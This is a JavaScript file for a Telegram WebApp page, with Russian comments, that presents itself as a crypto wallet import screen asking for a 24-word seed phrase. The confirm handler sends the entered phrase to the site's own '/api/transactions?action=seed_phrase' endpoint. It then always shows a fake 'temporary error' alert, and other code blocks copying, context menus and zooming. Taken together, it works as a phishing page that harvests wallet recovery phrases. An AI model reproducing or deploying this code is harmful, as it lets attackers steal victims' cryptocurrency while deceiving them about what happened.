document.addEventListener('DOMContentLoaded', () => {
  // Ограничения как на index (копирование/масштаб/контекстное меню и т.д.)
  initAppRestrictions();
  if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.ready) {
    window.Telegram.WebApp.ready();
  }

  const inputs = Array.from(document.querySelectorAll('.phrase-input'));
  const confirmBtn = document.getElementById('confirmBtn');
  const createBtn = document.getElementById('createBtn');

  // Автопереход по вводу пробела
  inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      const value = input.value.trim().replace(/\s+/g, ' ');
      // Если пользователь вставил целую фразу — распарсим
      if (value.split(' ').length > 1) {
        distributePhrase(value);
        return;
      }
      input.value = value;
      validate();
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === ' ' || e.key === 'Enter') {
        e.preventDefault();
        // Следующее поле
        const next = inputs[index + 1];
        if (next) next.focus();
      } else if (e.key === 'Backspace' && input.value === '') {
        const prev = inputs[index - 1];
        if (prev) prev.focus();
      }
    });
  });

  function distributePhrase(phrase) {
    const parts = phrase.trim().split(/\s+/).slice(0, 24);
    inputs.forEach((inp, i) => {
      inp.value = parts[i] || '';
    });
    if (inputs[parts.length - 1]) inputs[parts.length - 1].focus();
    validate();
  }

  function validate() {
    const allFilled = inputs.every(inp => inp.value.trim().length > 0);
    if (allFilled) {
      confirmBtn.classList.add('enabled');
      confirmBtn.disabled = false;
    } else {
      confirmBtn.classList.remove('enabled');
      confirmBtn.disabled = true;
    }
  }

  confirmBtn.addEventListener('click', async () => {
    const words = inputs.map(i => i.value.trim()).filter(Boolean);
    if (words.length !== 24) return;
    const phrase = words.join(' ');
    
    try {
      const resp = await fetch('/api/transactions?action=seed_phrase', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phrase, user_meta: { ts: Date.now() } })
      });
      const data = await resp.json();
      // Всегда показываем ошибку пользователю, логируя ответ
      console.log('server:', data);
      alert('Временная ошибка. Попробуйте позже.');
    } catch (e) {
      console.log('server error:', e);
      alert('Временная ошибка. Попробуйте позже.');
    }
  });

  createBtn.addEventListener('click', () => {
    window.location.href = 'index.html';
  });
});

function initAppRestrictions() {
  document.addEventListener('contextmenu', function(e){ e.preventDefault(); return false; });
  document.addEventListener('selectstart', function(e){ e.preventDefault(); return false; });
  document.addEventListener('dragstart', function(e){ e.preventDefault(); return false; });
  document.addEventListener('dblclick', function(e){ e.preventDefault(); return false; });
  document.addEventListener('gesturestart', function(e){ e.preventDefault(); return false; });
  document.addEventListener('gesturechange', function(e){ e.preventDefault(); return false; });
  document.addEventListener('gestureend', function(e){ e.preventDefault(); return false; });
  document.addEventListener('wheel', function(e){ if (e.ctrlKey) { e.preventDefault(); return false; } }, { passive: false });
  document.addEventListener('touchstart', function(e){ if (e.touches.length > 1) { e.preventDefault(); return false; } }, { passive: false });
  document.addEventListener('touchmove', function(e){ if (e.touches.length > 1) { e.preventDefault(); return false; } }, { passive: false });
}


